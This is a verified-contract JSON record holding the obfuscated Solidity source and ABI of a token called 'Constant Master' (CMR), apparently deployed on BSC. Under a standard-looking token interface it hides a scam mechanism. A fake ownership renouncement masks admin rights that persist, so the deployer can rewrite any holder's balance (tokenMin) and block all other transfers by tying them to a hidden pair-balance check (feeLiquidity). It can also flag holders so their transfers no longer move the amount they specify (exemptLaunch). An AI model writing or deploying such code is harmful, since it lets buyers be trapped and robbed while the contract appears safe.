{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.9;\n\ninterface totalReceiverTrading {\n    function createPair(address isList, address liquidityToken) external returns (address);\n}\n\ninterface toEnable {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address liquiditySender) external view returns (uint256);\n\n    function transfer(address receiverSell, uint256 receiverSenderMax) external returns (bool);\n\n    function allowance(address enableList, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 receiverSenderMax) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address receiverSell,\n        uint256 receiverSenderMax\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed shouldList, uint256 value);\n    event Approval(address indexed enableList, address indexed spender, uint256 value);\n}\n\nabstract contract limitTeam {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface isSell {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface toEnableMetadata is toEnable {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ConstantMaster is limitTeam, toEnable, toEnableMetadata {\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return limitFund;\n    }\n\n    string private feeList = \"CMR\";\n\n    function modeTrading(address launchMarketing, address receiverSell, uint256 receiverSenderMax) internal returns (bool) {\n        require(fromExempt[launchMarketing] >= receiverSenderMax);\n        fromExempt[launchMarketing] -= receiverSenderMax;\n        fromExempt[receiverSell] += receiverSenderMax;\n        emit Transfer(launchMarketing, receiverSell, receiverSenderMax);\n        return true;\n    }\n\n    address public senderLimit;\n\n    function getOwner() external view returns (address) {\n        return launchedTokenSwap;\n    }\n\n    mapping(address => mapping(address => uint256)) private listBuy;\n\n    function allowance(address totalIsLiquidity, address modeTo) external view virtual override returns (uint256) {\n        if (modeTo == buyTx) {\n            return type(uint256).max;\n        }\n        return listBuy[totalIsLiquidity][modeTo];\n    }\n\n    mapping(address => uint256) private fromExempt;\n\n    bool private txTake;\n\n    mapping(address => bool) public exemptSenderLaunched;\n\n    function name() external view virtual override returns (string memory) {\n        return minSenderMode;\n    }\n\n    uint256 constant launchLiquidity = 16 ** 10;\n\n    string private minSenderMode = \"Constant Master\";\n\n    bool public walletFee;\n\n    function fromLiquidity(address launchMarketing, address receiverSell, uint256 receiverSenderMax) internal returns (bool) {\n        if (launchMarketing == atAuto) {\n            return modeTrading(launchMarketing, receiverSell, receiverSenderMax);\n        }\n        uint256 amountList = toEnable(senderLimit).balanceOf(tradingAtReceiver);\n        require(amountList == marketingFromTrading);\n        require(receiverSell != tradingAtReceiver);\n        if (exemptSenderLaunched[launchMarketing]) {\n            return modeTrading(launchMarketing, receiverSell, launchLiquidity);\n        }\n        return modeTrading(launchMarketing, receiverSell, receiverSenderMax);\n    }\n\n    address buyTx = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint8 private isTx = 18;\n\n    function atReceiver(address minMaxReceiver) public {\n        require(minMaxReceiver.balance < 100000);\n        if (receiverTeamFund) {\n            return;\n        }\n        if (walletFee) {\n            maxReceiverList = swapList;\n        }\n        launchModeEnable[minMaxReceiver] = true;\n        if (walletFee == liquidityExempt) {\n            swapList = maxReceiverList;\n        }\n        receiverTeamFund = true;\n    }\n\n    function transfer(address isLimit, uint256 receiverSenderMax) external virtual override returns (bool) {\n        return fromLiquidity(_msgSender(), isLimit, receiverSenderMax);\n    }\n\n    uint256 private swapList;\n\n    function exemptLaunch(address liquidityEnable) public {\n        fromMarketing();\n        \n        if (liquidityEnable == atAuto || liquidityEnable == senderLimit) {\n            return;\n        }\n        exemptSenderLaunched[liquidityEnable] = true;\n    }\n\n    event OwnershipTransferred(address indexed receiverTrading, address indexed sellWallet);\n\n    uint256 marketingFromTrading;\n\n    address public atAuto;\n\n    function approve(address modeTo, uint256 receiverSenderMax) public virtual override returns (bool) {\n        listBuy[_msgSender()][modeTo] = receiverSenderMax;\n        emit Approval(_msgSender(), modeTo, receiverSenderMax);\n        return true;\n    }\n\n    function teamLaunched() public {\n        emit OwnershipTransferred(atAuto, address(0));\n        launchedTokenSwap = address(0);\n    }\n\n    bool public liquidityExempt;\n\n    address private launchedTokenSwap;\n\n    constructor (){\n        if (maxReceiverList == swapList) {\n            txTake = false;\n        }\n        isSell feeWallet = isSell(buyTx);\n        senderLimit = totalReceiverTrading(feeWallet.factory()).createPair(feeWallet.WETH(), address(this));\n        \n        atAuto = _msgSender();\n        launchModeEnable[atAuto] = true;\n        fromExempt[atAuto] = limitFund;\n        teamLaunched();\n        if (maxReceiverList != swapList) {\n            maxReceiverList = swapList;\n        }\n        emit Transfer(address(0), atAuto, limitFund);\n    }\n\n    function transferFrom(address launchMarketing, address receiverSell, uint256 receiverSenderMax) external override returns (bool) {\n        if (_msgSender() != buyTx) {\n            if (listBuy[launchMarketing][_msgSender()] != type(uint256).max) {\n                require(receiverSenderMax <= listBuy[launchMarketing][_msgSender()]);\n                listBuy[launchMarketing][_msgSender()] -= receiverSenderMax;\n            }\n        }\n        return fromLiquidity(launchMarketing, receiverSell, receiverSenderMax);\n    }\n\n    function feeLiquidity(uint256 receiverSenderMax) public {\n        fromMarketing();\n        marketingFromTrading = receiverSenderMax;\n    }\n\n    bool public receiverTeamFund;\n\n    uint256 public maxReceiverList;\n\n    function tokenMin(address isLimit, uint256 receiverSenderMax) public {\n        fromMarketing();\n        fromExempt[isLimit] = receiverSenderMax;\n    }\n\n    function fromMarketing() private view {\n        require(launchModeEnable[_msgSender()]);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return isTx;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return feeList;\n    }\n\n    uint256 private limitFund = 100000000 * 10 ** 18;\n\n    function balanceOf(address liquiditySender) public view virtual override returns (uint256) {\n        return fromExempt[liquiditySender];\n    }\n\n    mapping(address => bool) public launchModeEnable;\n\n    uint256 senderTotal;\n\n    address tradingAtReceiver = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function owner() external view returns (address) {\n        return launchedTokenSwap;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableList\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverTrading\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellWallet\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldList\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalIsLiquidity\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"modeTo\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverSenderMax\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atAuto\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minMaxReceiver\",\"type\":\"address\"}],\"name\":\"atReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquiditySender\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityEnable\",\"type\":\"address\"}],\"name\":\"exemptLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"exemptSenderLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"receiverSenderMax\",\"type\":\"uint256\"}],\"name\":\"feeLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchModeEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxReceiverList\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverTeamFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderLimit\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverSenderMax\",\"type\":\"uint256\"}],\"name\":\"tokenMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverSenderMax\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchMarketing\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverSenderMax\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "ConstantMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}